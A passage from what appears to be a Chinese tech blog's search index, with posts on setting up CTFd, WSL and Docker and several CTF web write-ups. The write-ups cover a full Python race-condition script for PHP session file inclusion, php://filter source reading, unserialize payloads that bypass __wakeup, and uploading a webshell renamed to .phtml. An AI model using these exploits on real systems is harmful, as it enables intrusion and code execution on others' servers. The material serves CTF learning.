新建ctfd.conf文件并修改  nano ctfd.conf   server {   listen 80;   server_name 10.0.90.10; #对外IP  access_log /var/log/nginx/access.log;  error_log /var/log/nginx/error.log;  charset utf-8;  location / {   proxy_pass http://127.0.0.1:8000; # 转发的地址，即Gunicorn运行的地址   proxy_redirect off;   proxy_set_header Host $host;   proxy_set_header X-Real-IP $remote_addr;   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;   proxy_set_header X-Forwarded-Proto $scheme;             }  location /themes/core/static { # 处理静态文件夹中的静态文件   alias /var/www/html/CTFd-master/CTFd/themes/core/static;   expires 5m; # 设置缓存过期时间                                }   location /themes/admin/static { # 处理静态文件夹中的静态文件   alias /var/www/html/CTFd-master/CTFd/themes/admin/static;   expires 5m; # 设置缓存过期时间                                  }        }   最后运行如下命令  nginx -t 测试配置文件是否正确  ln -s /etc/nginx/sites-enabled/ctfd.conf /etc/nginx/sites-available/ctfd.conf  netstat -4anep|grep 80  systemctl stop apache2 #关闭其他占用80端口的进程  systemctl restart nginx   返回ctfd目录  cd CTFd-master   配置后台监视程序  nano /etc/supervisor/conf.d/ctfd.conf  [program:ctfd] command=/usr/local/bin/gunicorn --bind 0.0.0.0:8000 -w 9 --worker-class=\"gevent\" \"CTFd:create_app()\" directory=/var/www/html/CTFd-master #项目目录 user=root autorestart=true #设置随supervisor服务自动重启 startretires=3 #重启失败3次   三、配置服务  进入http://:8000，对ctfd后台进行配置  “172.19.0.2/16”"
  },
  
  {
    "title": "WSL与WSA的安装配置",
    "url": "/posts/wsl-and-wsa/",
    "categories": "Blogs",
    "tags": "wsl, wsa",
    "date": "2022-10-29 20:12:00 +0800",
    "content": "本文作者是E-butx，系彼时西安铁一中滨河高级中学机房中的一群人，我在后面进行了WSA的补充  WSL安装  WSL（Windows Subsystem for Linux，适用于Windows的Linux子系统）     The Windows Subsystem for Linux lets developers run a GNU/Linux  environment – including most command-line tools, utilities, and  applications – directly on Windows, unmodified, without the overhead of a virtual machine.    摘自 https://docs.microsoft.com/      简单的说就是，Linux 的 Windows 子系统让开发人员无需虚拟机就可以直接在 Windows 上运行 Linux 环境，包括大多数命令行工具、程序和应用。    摘自 https://www.zhihu.com/   WSL1 VS WSL2                 功能       WSL 1       WSL 2                       Windows 和 Linux 之间的集成       ✅       ✅                 启动时间短       ✅       ✅                 与传统虚拟机相比，占用的资源量少       ✅       ✅                 可以与当前版本的 VMware 和 VirtualBox 一起运行       ✅       ✅                 托管 VM       ❌       ✅                 完整的 Linux 内核       ❌       ✅                 完全的系统调用兼容性       ❌       ✅                 跨 OS 文件系统的性能       ✅       ❌              WSL 2 是适用于 Linux 的 Windows 子系统体系结构的一个新版本，它支持适用于 Linux 的 Windows 子系统在 Windows 上运行 ELF64 Linux 二进制文件。 它的主要目标是提高文件系统性能，以及添加完全的系统调用兼容性。    这一新的体系结构改变了这些 Linux 二进制文件与Windows 和计算机硬件进行交互的方式，但仍然提供与 WSL 1（当前广泛可用的版本）中相同的用户体验。    单个 Linux 分发版可以在 WSL 1 或 WSL 2 体系结构中运行。 每个分发版可随时升级或降级，并且你可以并行运行 WSL 1 和 WSL 2 分发版。 WSL 2 使用全新的体系结构，该体系结构受益于运行真正的 Linux 内核。    以上摘自 https://docs.microsoft.com/      WSL：并不是一个真正的 Linux 操作系统，仅仅是 Linux 应用程序与 Windows 操作系统之间的一个适配层。    在这个适配层之上，可以运行 Linux 应用程序，有点类似于以前的 cygwin 的方式。    WSL2：它就是一个虚拟机，类似于 Vitual Box，在这个虚拟机之上，运行一个完整的 Linux 操作系统。    相对于 Virtual Box、VMWare 来说，WSL2提供更全面的兼容性、与 Windows 系统的互操作性更好、运行速度更快、占用系统资源更少。    摘自 https://cloud.tencent.com/developer/article/   1、启动windows子系统与虚拟化  首先需要把CPU的虚拟化打开，可以通过任务管理器查看是否启动了虚拟化。  接着在控制面板\\程序与功能\\启动或关闭Windows功能中选择Hyper-V，适用于Linux的Windows子系统、虚拟机平台并保存，之后重启。  2、升级  下载Microsoft提供的适用于 x64 计算机的 WSL2 Linux 内核更新包  Windows11下，使用PowerShell，输入  wsl --update --web-download   注意，缺少参数--web-download会导致进度条卡顿，原因是国内微软下载无法连接。  3、安装  命令行安装。  wsl --list --online # 显示所有可用的分发版 wsl --install --distribution kali-linux # 安装分发版   在此之后只需运行新安装的分发版即可。它会让你等待一段时间，然后要求你键入 Username 和 Password（这里假设是 testuser 和 123456）。  在默认情况下，wsl的存储地址在C盘，可以通过导入导出更换目录；  wsl --export kali-linux C:\\kali.tar # 导出为tar包 wsl --unregister kali-linux # 删除当前分发 wsl --import kali-linux &lt;目标路径&gt; C:\\kali.tar --version 2# 重新导入  wsl -l -v # 检查是否导入成功 kali config --default-user testuser # 设置用户为安装时创建的   如果需要关闭虚拟机，则使用：  wsl --terminate kali-linux   WSA安装     Windows Subsystem for Android （中文译名：适用于 Android™️ 的 Windows 子系统） 包括 Linux内核和基于 Android开源项目（AOSP）版本的 Android 操作系统。该子系统在 Hyper-V 虚拟机中运行，可以将 AOSP 环境中 App 的运行时和 API 映射到 Windows 图形层、内存缓冲区、输入模式、物理和虚拟设备以及传感器，已现身微软商店，需要 8GB 内存并推荐 16GB 配置，可在 ARM64 或 x64 处理器以及英特尔、AMD、高通的 CPU 上运行。 Windows Subsystem for Android将面向 Beta 通道的美国用户开启测试。    2024年3月6日，微软公布公告，适用于安卓的 Windows 子系统（WSA）和亚马逊应用商店将在 2025 年 3 月 5 日之后不再在 Microsoft Store 中提供。   1、下载安装必要文件  在Microsoft Store - Generation Project (v1.2.3)中左侧选择对应通道「ProductId」，并在中间输入 WSA 的产品代码「9P3395VX91NR」，在右边按需选择更新通道，推荐选择「Fast」下载如下文件。  Microsoft.UI.Xaml.2.8_8.2310.30001.0_x64__8wekyb3d8bbwe.appx  MicrosoftCorporationII.WindowsSubsystemForAndroid_2407.40000.4.0neutral~_8wekyb3d8bbwe.msixbundle  下载之后重命名并用命令行安装，或者                 [Windows Subsystem for Android™ with Amazon Appstore - Windows官方下载       微软应用商店       Microsoft Store](https://apps.microsoft.com/detail/9p3395vx91nr?hl=zh-cn&amp;gl=us)           2、安装SDK                 在[SDK 平台工具版本说明       Android Studio       Android Developers](https://developer.android.google.cn/tools/releases/platform-tools?hl=zh-cn)下载适用于 Windows 的 SDK Platform-Tools，并将其添加到环境变量中"
  },
  
  {
    "title": "WinServer19+CTFd+Docker部署动态靶机",
    "url": "/posts/win-ctfd/",
    "categories": "Cyber Security",
    "tags": "ctf, web, ctfd",
    "date": "2022-09-05 20:12:00 +0800",
    "content": "lamaper@qq.com                 [安装       CTFd 文档](https://docs.ctfd.io/docs/deployment/installation)           一、部署服务端Docker  正确安装Windows Server 2019；  若要在 Windows Server 上安装 Docker，可以使用由 Microsoft 发布的 OneGet 提供程序 PowerShell 模块（称为 DockerMicrosoftProvider）。  注：在购买的服务器中不可直接安装docker desktop，因为购买的服务器已经进行过一次虚拟化，安装  此提供程序启用 Windows 中的容器功能，并安装 Docker 引擎和客户端。 以下是操作方法：  0、安装FastGithub  Releases · dotnetcore/FastGithub  fastgithub国内镜像(gitee.com)  运行fastgithub  1、安装docker  打开提升的 PowerShell 会话，从 PowerShell 库安装 Docker-Microsoft PackageManagement 提供程序。  Install-Module -Name DockerMsftProvider -Repository PSGallery -Force   如果系统提示安装 NuGet 提供程序，键入 Y 进行安装。  如果出错，应该关闭PowerShell窗口，用admin权限重新打开操作，因为实践中发现下载中断后无法继续的情况。  如果在打开 PowerShell 库时遇到错误，则可能需要将 PowerShell 客户端使用的 TLS 版本设置为 TLS 1.2。 为此，请运行以下命令：  # Set the TLS version used by the PowerShell client to TLS 1.2.   [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;   2、使用 PackageManagement PowerShell 模块安装最新版本的 Docker  Install-Package -Name docker -ProviderName DockerMsftProvider   PowerShell 询问是否信任包源“DockerDefault”时，键入 A 以继续进行安装。  在安装完成后，请重启计算机。  Restart-Computer -Force   3、如果希望稍后更新 Docker，请执行以下操作：  使用以下命令检查安装的版本：  Get-Package -Name Docker -ProviderName DockerMsftProvider   使用以下命令查找当前版本：  Find-Package -Name Docker -ProviderName DockerMsftProvider   准备好升级后，运行以下命令：  Install-Package -Name Docker -ProviderName DockerMsftProvider -Update -Force   4、完善部署、安装GUI、安装docker-compose  运行以下命令以启动 Docker：  Start-Service Docker   在Powershell输入命令查看是否正常运行：  docker   安装完成的docker EE 默认内核为windows，通常情况下需要切换到linux内核，可通过如下代码进行切换：  [Environment]::SetEnvironmentVariable(\"LCOW_SUPPORTED\", \"1\", \"Machine\")  Restart-Service Docker   Windows server 的 docker 没有可视化UI，可安装第三方的工具，比如 portainer：  docker run -d --name portainer --restart always -p 9000:9000 -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine portainer/portainer   安装docker-compose：  Invoke-WebRequest \"https://github.com/docker/compose/releases/download/v2.6.1/docker-compose-Windows-x86_64.exe\" -UseBasicParsing -OutFile $Env:ProgramFiles\\Docker\\docker-compose.exe   注意，在安装docker-compose后请输入该命令以确保docker-compose正确安装：  docker-compose --version   如果报错，则代表docker-compose没有被正确安装，解决方法是，直接使用github下载最新版Release v2.15.1 · docker/compose · GitHub，之后将下载后的文件放入/docker目录下，删除原来的docker-compose.exe，替换为新下载的文件，并改名为docker-compose.exe，即可。  二、下载安装CTF-d  1、下载CTF-d  Release 3.5.0 · CTFd/CTFd · GitHub  2、部署CTF-d  修改ctfd目录下docker-compose.yml的SECRET_KEY；  在ctfd目录下打开powershell，运行  docker-compose up   在本地浏览器http://localhost:8000进行初始化  问题解决：no matching manifest for windows/amd64 10.0.17763 in the manifest list entries  当出现此类问题时，代表docker启动的参数有问题，此时先停止docker服务；  net stop docker   之后win+R启动运行，打开注册表（regedit），进入到计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\docker下，修改ImagePath，将其键值改为：\"&lt;Docker安装位置&gt;\\Docker\\dockerd.exe\" --run-service --experimental=true;  然后重新启动docker服务  net start docker"
  },
  
  {
    "title": "PHP的session文件包含与条件竞争",
    "url": "/posts/php-session/",
    "categories": "Cyber Security",
    "tags": "php, web, ctf, session",
    "date": "2022-08-25 18:12:21 +0800",
    "content": "lamaper@qq.com  lamaper - 博客园 (cnblogs.com)  一、什么是Session     Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。   由于html的特性，多个请求之间无关联，如果在/xxx.html中为登录状态，那么跳转到/yyy.html就会变成默认的未登录状态，seesion的出现是为了弥补这一缺陷，让每一个用户在多个请求中状态一致。  session是保存在服务端的，与之相对的是cookie，cookie是保存在客户端的。每当用户使用一浏览器开始对服务器发出请求，一个session就会被创建，当用户关闭浏览器结束访问，session会被删除。所以用同一个ip访问同一个网站，如果浏览器不同，用户状态也是不同的，所以session创建的标准是浏览器而不是ip。session不随刷新页面而消失。     以下内容以php举例   每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。  这个session是32位的。  session的存储地址在php.ini文件中会被标明，一般最后一级目录会是\\tmp，当一个会话开始的时候，服务器会在目录下写入sess_xxxxxxxxxx文件，下划线后的就是这个会话的session_id。  二、一些session的服务端操作  一般我们通过$_SESSION['&lt;变量名&gt;'] = ....将一些数据存储在session中。这些数据最终会被以序列化后的格式存储在sess_文件中。session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存。  一些常用的函数与参数  save_handler不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。  session.use_cookies 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，这个名称可以进行修改，如修改成PhPP，就会在浏览器cookie中创建PhPP的sessionid。  session.auto_start = 0用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start()；函数开启，如果设置成1，那么session_id 也会自动就生成了。  session.cookie_lifetime = 0这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。  gc_divisor, gc_probability, gc_maxlifetime是回收这些sess_xxxxx 的文件，它是按照这3个参数，组成的比率，来启动GC删除这些过期的sess文件。gc_maxlifetime是sess_xxx文件的过期时间。  三、session恶意代码  在phpinfo()中存在这些数据  1,session.save_handler\tfiles\tfiles     表示session以文件的形式存储。 2,session.save_path\t/tmp\t/tmp     表示session存储目录在/tmp下。 3,session.serialize_handler\tphp\tphp     表示反序列化和序列号的处理器是PHP。 4,session.upload_progress.cleanup\tOn\tOn     表示文件上传结束后，php会立即清除对应session文件中的内容。 5,session.upload_progress.enabled\tOn\tOn     表示upload_progress功能启动，即浏览器向服务器上传文件时，php会把此次文件上传的详细信息存储在session中。 6,session.upload_progress.freq\t1%\t1% 7,session.upload_progress.min_freq\t1\t1     freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。 8,session.upload_progress.name\tPHP_SESSION_UPLOAD_PROGRESS\tPHP_SESSION_UPLOAD_PROGRESS 9,session.upload_progress.prefix\tupload_progress_\tupload_progress_     prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名 10,session.use_cookies\tOn\tOn     表示使用cookie记录sessionid。 11,session.use_only_cookies\tOn\tOn     表示是否在客户端仅仅使用 cookie 来存放会话 ID。 12,session.use_strict_mode\tOff\tOff     值为off，表示Cookie中的sessionid可控。   一般来说PHP_SESSION_UPLOAD_PROGRESS是开的，所以我们一般会往这个键值中写入恶意代码，然后让整个sess文件被文件包含后解析代码，最终执行代码。  以 NSSCTF - 第五空间 2021\\EasyCleanup (ctfer.vip)为例  服务端代码出现  if(isset($_GET['file'])){      if(strlen($_GET['file']) &gt; 15 | filter($_GET['file'])) exit(\"hacker\");      include $_GET['file'];  }    我们考虑进行文件包含，之后使用其他方法先对phpinfo进行查看，观察是否关闭了session.upload_progress.cleanup，若没有则可以直接使用burp上传恶意代码，若存在则需要不停上传同一个session来确保恶意代码能够执行。  四、脚本编写  我们一般通过python进行脚本编写（python版本3.8+）  首先导入两个库  import threading import requests   requests用来进行网络请求，threading用来分离线程，做到不断循环上传session从而竞争。  定义基本信息  target_url = \"http://xxx.xxx.xxx.xxx/index.php\"#据情况而定 session_id = \"flag\"#自行决定 expcode = {\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('ls');?&gt;\"}#自行要执行的代码 MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致 proxies = {     \"http\": \"127.0.0.1:8080\", }#设置本机代理，也可以不设置   编写竞争函数  def send_file(session):#形参为后面多线程的指令集提供入口     while True:         resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', \"nothing\")}, cookies=MyCookie)   不停的上传同样的post请求。将结果存于res.txt中。  编写读取信息函数  def getflag(session):     while True:         payload_url = target_url + '?file=' + '/tmp/sess_' + session_id         #根据漏洞进行伪协议读取文件         resp = requests.get(url=payload_url)         if 'upload_progress' in resp.text:             print(resp.text)             break   main函数  if __name__ == '__main__':     session = requests.session()     t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程     t.start()     #两个线程独立运行     getflag(session)   完整代码  import threading import requests  target_url = \"http://xxx.xxx.xxx.xxx/index.php\"#据情况而定 session_id = \"flag\"#自行决定 expcode = {\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('ls');?&gt;\"}#自行要执行的代码 MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致 proxies = {     \"http\": \"127.0.0.1:8080\", }#设置本机代理，也可以不设置  def send_file(session):#形参为后面多线程的指令集提供入口     while True:         resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', \"nothing\")}, cookies=MyCookie)          def getflag(session):     while True:         payload_url = target_url + '?file=' + '/tmp/sess_' + session_id         #根据漏洞进行伪协议读取文件         resp = requests.get(url=payload_url)         if 'upload_progress' in resp.text:             print(resp.text)             break  if __name__ == '__main__':     session = requests.session()     t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程     t.start()     #两个线程独立运行     getflag(session)   五、参考文献与拓展                 [什么是session       许小珂 (xuxiaoke.com)](https://www.xuxiaoke.com/phpnote/35.html)           从第五空间 2021\\EasyCleanup认识php_session_Aiwin-Lau的博客-CSDN博客  PHP Session.upload_progress - chalan630 - 博客园 (cnblogs.com)  PHP：会话上传进度 （php官网）  对于session.upload_progress漏洞的理解_huamanggg的博客-CSDN博客   详解利用session进行文件包含_合天网安实验室的博客-CSDN博客_session文件包含"
  },
  
  {
    "title": "SWPUCTF 2021 新生赛 include",
    "url": "/posts/swpu2021-4/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2022-08-09 20:12:00 +0800",
    "content": "[SWPUCTF 2021 新生赛 include lamaper的WriteUp       NSSCTF](https://www.nssctf.cn/note/set/373)           知识点：php伪协议  php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。  首先看到题目提示传个file，遂/?file=…….一个随意参数，而后得到源代码 &lt;?php ini_set(\"allow_url_include\",\"on\"); header(\"Content-type: text/html; charset=utf-8\"); error_reporting(0); $file=$_GET['file']; if(isset($file)){     show_source(__FILE__);     echo 'flag 在flag.php中'; }else{     echo \"传入一个file试试\"; } echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; include_once($file); ?&gt; flag 在flag.php中  发现有include_once函数； include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。  于是利用伪协议构造， php://filter/convert.base64-encode/resource=flag.php  得到经过Base64加密的flag，解密即可。  另：php伪协议 常见的php伪协议  1）file://     访问本地文件系统  2）http://   访问HTTP(S)网址  3）ftp://      访问FTP(S)URL  4)php://      访问各个输出输入流  5)zlib://       处理压缩流  6)data://     读取数据  7)glob://      查找匹配的文件路径模式  8)phar://      PHP归档  9)rar://         RAR数据压缩"
  },
  
  {
    "title": "SWPUCTF 2021 新生赛 ez_unserialize",
    "url": "/posts/swpu2021-3/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2022-08-09 20:12:00 +0800",
    "content": "[SWPUCTF 2021 新生赛]ez_unserialize lamaper的WriteUp                 [SWPUCTF 2021 新生赛 ez_unserialize lamaper的WriteUp       NSSCTF](https://www.nssctf.cn/note/set/374)           知识点：robots.txt、php反序列化漏洞  进入环境，没有给出任何提示，不知道题目要求干什么，使用后台扫描工具（御剑后台扫描、dirmap等）可以看到存在一个robots.txt；  关于robots.txt，robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。 但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。 如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。  从robots文件中得知存在/cl45s.php，遂进入该目录下打开该文件，获得代码 &lt;?php  error_reporting(0); show_source(\"cl45s.php\");  class wllm{      public $admin;     public $passwd;      public function __construct(){         $this-&gt;admin =\"user\";         $this-&gt;passwd = \"123456\";     }          public function __destruct(){         if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"ctf\"){             include(\"flag.php\");             echo $flag;         }else{             echo $this-&gt;admin;             echo $this-&gt;passwd;             echo \"Just a bit more!\";         }     } }  $p = $_GET['p']; unserialize($p);  ?&gt;  可以看到类wllm中，__destruct()方法被重写，需要修改类成员变量内部值来获取flag，因为__destruct()方法是在对象被销毁是调用，由此我们先创建一个对象，给其成员赋值然后进行序列化  &lt;?php class wllm{      public $admin;     public $passwd;      public function __construct(){         $this-&gt;admin =\"user\";         $this-&gt;passwd = \"123456\";     }          public function __destruct(){         if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"ctf\"){             include(\"flag.php\");             echo $flag;         }else{             echo $this-&gt;admin;             echo $this-&gt;passwd;             echo \"Just a bit more!\";         }     } } $aa = new wllm(); $aa-&gt;admin = \"admin\"; $aa-&gt;passwd = \"ctf\"; $stus = serialize($aa); print_r($stus); ?&gt;  得到序列化的结果 O:4:\"wllm\":2:{s:5:\"admin\";s:5:\"admin\";s:6:\"passwd\";s:3:\"ctf\";}  将结果传入/?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}  最后得到flag  另 什么是反序列化漏洞  当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。  PHP魔术方法  魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。  1、__get、__set  这两个方法是为在类和他们的父类中没有声明的属性而设计的  __get( $property ) 当调用一个未定义的属性时访问此方法  __set( $property, $value ) 给一个未定义的属性赋值时调用  这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）  2、__isset、__unset  __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法  __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法  与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）  3、__call  __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法  4、__autoload  __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。  注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。  5、__construct、__destruct  __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称  __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法  默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.  在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。  6、__clone  PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。  7、__toString  __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。  在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）  从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。  8、__sleep、__wakeup  __sleep 串行化的时候用  __wakeup 反串行化的时候调用  serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。  使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。  相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。  9、__set_state  当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。  10、__invoke  当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效  11、__callStatic  它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。  同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。   #####"
  },
  
  {
    "title": "SWPUCTF 2021 新生赛 easyupload2.0",
    "url": "/posts/swpu2021-2/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2022-08-09 20:12:00 +0800",
    "content": "[SWPUCTF 2021 新生赛]easyupload2.0 lamaper的WriteUp SWPUCTF 2021 新生赛easyupload2.0 lamaper的WriteUp | NSSCTF  知识点：远程执行，php的多种格式  一打开题目发现需要上传文件，尝试后台扫描发现git库泄漏，但没发现有用的东西，于是上传一句话木马，发现不能上传php，于是修改文件扩展名为。phtml成功上传，使用中国蚁剑进行远程连接，发现目录中有flag.php cat ../flag.php  获得flag  复盘 分析一下源代码 index.php &lt;?php session_start(); echo \" &lt;meta charset=\\\"utf-8\\\"&gt; &lt;title&gt;下手轻点，求求了&lt;/title&gt; &lt;a&gt;&lt;img src=\\\"https://gitee.com/a-sprite-of-84/docker-upload1/raw/master/images/upload1.jpg\\\" alt=\\\"upload1.jpg\\\" border=\\\"0\\\" /&gt;&lt;/a&gt; &lt;form action=\\\"upload.php\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"&gt; &lt;input type=\\\"file\\\" name=\\\"uploaded\\\" /&gt; &lt;br/&gt; &lt;input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"感觉要被秒了\\\" /&gt; &lt;/form&gt;\"; if(!isset($_SESSION['user'])){     $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000)); } ?&gt;  upload.php &lt;?php session_start(); echo \" &lt;meta charset=\\\"utf-8\\\"&gt;\"; if(!isset($_SESSION['user'])){     $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES['uploaded']))  {     $target_path  =  \"./upload\";     $t_path = $target_path . \"/\" . basename($_FILES['uploaded']['name']);     $uploaded_name = $_FILES['uploaded']['name'];     $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,'.') + 1);     $uploaded_size = $_FILES['uploaded']['size'];     $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];       if(preg_match(\"/php|hta|ini/i\", $uploaded_ext))     {         die(\"php是不行滴\");     }     else     {         $content = file_get_contents($uploaded_tmp);         move_uploaded_file($uploaded_tmp, $t_path);         echo \"{$t_path} succesfully uploaded!\";         } } else {     die(\"不传🐎还想要f1ag?\"); } ?&gt;  发现用正则表达式过滤了.php/.hta/.ini，因而除了php以外的php文件都可以上传； 另 php3，php5，pht，phtml，phps都是php可运行的文件扩展名"
  },
  
  {
    "title": "SWPUCTF 2021 新生赛 no_wakeup",
    "url": "/posts/swpu2021-1/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2022-08-09 20:12:00 +0800",
    "content": "[SWPUCTF 2021 新生赛]no_wakeup lamaper的WriteUp  知识点：反序列化、__weakup()绕过  进入题目发现源代码 &lt;?php header(\"Content-type:text/html;charset=utf-8\"); error_reporting(0); show_source(\"class.php\"); class HaHaHa{         public $admin;         public $passwd;          public function __construct(){             $this-&gt;admin =\"user\";             $this-&gt;passwd = \"123456\";         }          public function __wakeup(){             $this-&gt;passwd = sha1($this-&gt;passwd);         }          public function __destruct(){             if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"wllm\"){                 include(\"flag.php\");                 echo $flag;             }else{                 echo $this-&gt;passwd;                 echo \"No wake up\";             }         }     } $Letmeseesee = $_GET['p']; unserialize($Letmeseesee); ?&gt;  在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；  php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造 $aa = new HaHaHa(); $aa-&gt;admin = \"admin\"; $aa-&gt;passwd = \"wllm\"; $stus = serialize($aa); print_r($stus);  得到 O:6:\"HaHaHa\":2:{s:5:\"admin\";s:5:\"admin\";s:6:\"passwd\";s:4:\"wllm\";}  修改得到 O:6:\"HaHaHa\":3:{s:5:\"admin\";s:5:\"admin\";s:6:\"passwd\";s:4:\"wllm\";}  上传即可"
  },
  
  {
    "title": "Qt5.12学习记录",
    "url": "/posts/qt-study/",
    "categories": "Coding",
    "tags": "qt",
    "date": "2022-07-01 12:00:00 +0800",
